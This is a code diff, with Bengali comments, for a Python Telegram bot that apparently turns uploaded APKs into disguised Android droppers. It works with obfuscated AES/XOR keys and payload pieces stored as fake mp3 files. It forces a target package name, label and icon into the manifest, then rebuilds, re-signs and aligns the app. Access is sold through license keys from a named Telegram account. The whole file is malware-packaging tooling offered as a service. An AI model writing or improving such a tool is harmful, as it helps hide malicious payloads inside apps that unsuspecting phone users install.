@@ -68,7 +68,7 @@ ACTUAL_AES_KEY = decode_obfuscated(OBFUSCATED_AES_KEY_B64)
 ACTUAL_XOR_KEY = decode_obfuscated(OBFUSCATED_XOR_KEY_B64)
 IV_HEX = "aabbccddeeffaabbccddeeffaabbccdd"
 NUM_PARTS = 15
-PREFIX = "part_"   # <-- getSecret(3) খালি স্ট্রিং দিলে ফাইল নাম হবে 0.mp3, 1.mp3 ...
+PREFIX = "part_"   # getSecret(3) খালি স্ট্রিং দিলে ফাইল নাম 0.mp3, 1.mp3 ...
 TARGET_PACKAGE = "com.meteah.apl"
 
 # ----- ডাটাবেস (কী + ডেইলি লিমিট ট্র্যাক) -----
@@ -96,7 +96,6 @@ def generate_key(user_id):
     expiry = (datetime.datetime.now() + datetime.timedelta(days=30)).isoformat()
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    # key আছে কিনা চেক করি, যদি থাকে আপডেট করি
     c.execute('SELECT user_id FROM keys WHERE user_id=?', (user_id,))
     row = c.fetchone()
     if row:
@@ -139,21 +138,17 @@ def check_daily_limit(user_id):
     conn.close()
     today = datetime.datetime.now().date().isoformat()
     if not row:
-        # প্রথমবার – অনুমতি দিন
         return True
     last_date, count = row
     if last_date == today:
         return count < DAILY_LIMIT
     else:
-        # নতুন দিন – কাউন্ট রিসেট (এখনই রিসেট করা হবে, কিন্তু অনুমতি দিন)
-        # আমরা রিসেট করব ইনক্রিমেন্টের সময়
-        return True  # নতুন দিনে প্রথম ব্যবহার অনুমোদিত
+        return True
 
 def increment_use(user_id):
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
     today = datetime.datetime.now().date().isoformat()
-    # যদি আগের দিনের ডেটা থাকে, রিসেট করে কাউন্ট 1 করি, নাহলে কাউন্ট বাড়াই
     c.execute('SELECT last_use_date, use_count FROM keys WHERE user_id=?', (user_id,))
     row = c.fetchone()
     if row:
@@ -164,7 +159,6 @@ def increment_use(user_id):
             new_count = 1
         c.execute('UPDATE keys SET last_use_date=?, use_count=? WHERE user_id=?', (today, new_count, user_id))
     else:
-        # নতুন ইউজার, প্রথম ব্যবহার
         c.execute('INSERT INTO keys (user_id, last_use_date, use_count) VALUES (?, ?, 1)', (user_id, today))
     conn.commit()
     conn.close()
@@ -175,9 +169,7 @@ def has_been_asked_to_join(user_id):
     c.execute('SELECT asked_to_join FROM keys WHERE user_id=?', (user_id,))
     row = c.fetchone()
     conn.close()
-    if row:
-        return row[0] == 1
-    return False
+    return row and row[0] == 1
 
 def mark_asked_to_join(user_id):
     conn = sqlite3.connect(DB_PATH)
@@ -297,8 +289,11 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
 
         manifest_path = os.path.join(decoded_dropper, 'AndroidManifest.xml')
         if os.path.exists(manifest_path):
-            with open(manifest_path, 'r') as f:
+            with open(manifest_path, 'r', encoding='utf-8') as f:
                 content = f.read()
+            # ----- Package name change -----
+            content = re.sub(r'package="[^"]*"', f'package="{TARGET_PACKAGE}"', content)
+            # ----- Label & icon -----
             if 'android:label="' in content:
                 content = re.sub(r'android:label=".*?"', 'android:label="@string/app_name"', content)
             else:
@@ -307,7 +302,7 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
                 content = re.sub(r'android:icon=".*?"', 'android:icon="@drawable/img"', content)
             else:
                 content = content.replace('<application ', '<application android:icon="@drawable/img" ')
-            with open(manifest_path, 'w') as f:
+            with open(manifest_path, 'w', encoding='utf-8') as f:
                 f.write(content)
 
         output_apk = os.path.join(work_dir, 'output.apk')
@@ -317,6 +312,7 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             await context.bot.send_message(chat_id, f"❌ Rebuild failed:\n{result.stderr[:500]}")
             return
 
+        # ----- Sign with apksigner (v1/v2/v3/v4) -----
         keystore = os.path.join(os.getcwd(), 'signer', 'myKey.p12')
         if not os.path.exists(keystore):
             await context.bot.send_message(chat_id, "❌ Keystore not found! Please upload signer/myKey.p12")
@@ -327,12 +323,14 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
                 passwd = f.read().strip()
         else:
             passwd = os.environ.get('KEYSTORE_PASS', '123456')
-        cmd = f"jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore {keystore} -storetype PKCS12 -storepass {passwd} -keypass {passwd} {output_apk} mykey"
+
+        cmd = f"apksigner sign --ks {keystore} --ks-pass pass:{passwd} --v1-signing-enabled true --v2-signing-enabled true --v3-signing-enabled true --v4-signing-enabled true {output_apk}"
         result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
         if result.returncode != 0:
             await context.bot.send_message(chat_id, f"❌ Signing failed:\n{result.stderr[:500]}")
             return
 
+        # ----- Align -----
         aligned_apk = os.path.join(work_dir, 'aligned.apk')
         try:
             subprocess.run(f"zipalign -v -p 4 {output_apk} {aligned_apk}", shell=True, check=True)
@@ -387,7 +385,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         mark_asked_to_join(user_id)
 
-    # বোতাম অনুযায়ী কাজ
     if query.data == 'get_key':
         existing = get_user_key(user_id)
         if existing and validate_key(user_id):
@@ -400,17 +397,15 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "After activation, you can upload more than the daily limit."
         )
     elif query.data == 'upload':
-        # চেক ডেইলি লিমিট
         if not check_daily_limit(user_id):
-            # ডেইলি লিমিট শেষ, কী আছে কিনা চেক করুন
             if validate_key(user_id):
-                # কী আছে, অনুমতি দিন
                 await query.edit_message_text("📤 You have a valid license. Send your APK file.")
                 return
             else:
+                # ----- Free trial expired message -----
                 await query.edit_message_text(
-                    f"❌ Daily free limit ({DAILY_LIMIT}) reached.\n"
-                    "Please get a license key from @Red_teem to continue using today."
+                    "❌ You expire free tral limit try tomorrow.\n"
+                    "To get more usage, contact @Red_teem for a license key."
                 )
                 return
         await query.edit_message_text("📤 Send your APK file.")
@@ -433,16 +428,14 @@ async def upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         mark_asked_to_join(user_id)
 
-    # চেক ডেইলি লিমিট
     if not check_daily_limit(user_id):
-        # চেক কী আছে কিনা
         if validate_key(user_id):
-            # কী আছে, অনুমতি
             pass
         else:
+            # ----- Free trial expired message -----
             await update.message.reply_text(
-                f"❌ Daily free limit ({DAILY_LIMIT}) reached.\n"
-                "Please get a license key from @Red_teem to continue using today."
+                "❌ You expire free tral limit try tomorrow.\n"
+                "To get more usage, contact @Red_teem for a license key."
             )
             return
 
@@ -455,13 +448,12 @@ async def upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         file = await update.message.document.get_file()
         apk_data = await file.download_as_bytearray()
-        # ব্যবহার বাড়ান (ডেইলি কাউন্ট ইনক্রিমেন্ট)
         increment_use(user_id)
         context.application.create_task(process_apk_file(update, context, apk_data))
     except Exception as e:
         await update.message.reply_text(f"❌ Failed to download: {str(e)}")
 
-# ----- অ্যাক্টিভেট কমান্ড (ইউজার কী প্রবেশ করাবে) -----
+# ----- অ্যাক্টিভেট কমান্ড -----
 async def activate(update: Update, context: ContextTypes.DEFAULT_TYPE):
     args = context.args
     if not args:
@@ -469,14 +461,12 @@ async def activate(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     user_id = update.effective_user.id
     key = args[0]
-    # চেক করি এই কী ইউজারের জন্য বৈধ কিনা (আমরা ডাটাবেসে কী সংরক্ষণ করি, তাই যদি এই কী ইউজারের সাথে মিলে)
-    # কিন্তু আমরা যদি ইউজারের জন্য কী জেনারেট করি, তাহলে সেই কী-ই বৈধ। তাই আমরা চেক করি ডাটাবেসে ওই ইউজারের জন্য ওই কী আছে কিনা।
     if validate_key(user_id, key):
         await update.message.reply_text("✅ Key activated! You can now upload unlimited APKs.")
     else:
         await update.message.reply_text("❌ Invalid key. Please contact @Red_teem to get a valid key.")
 
-# ----- অ্যাডমিন কমান্ড (ইউজারের জন্য কী জেনারেট) -----
+# ----- অ্যাডমিন কমান্ড -----
 async def genkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_USER_ID:
         await update.message.reply_text("❌ You are not authorized to use this command.")
@@ -530,8 +520,6 @@ def run_bot():
 
 # ----- মেইন -----
 if __name__ == "__main__":
-    # Flask আলাদা থ্রেডে চালু করুন
     flask_thread = threading.Thread(target=run_flask, daemon=True)
     flask_thread.start()
-    # বট মেইন থ্রেডে চালু করুন
     run_bot()
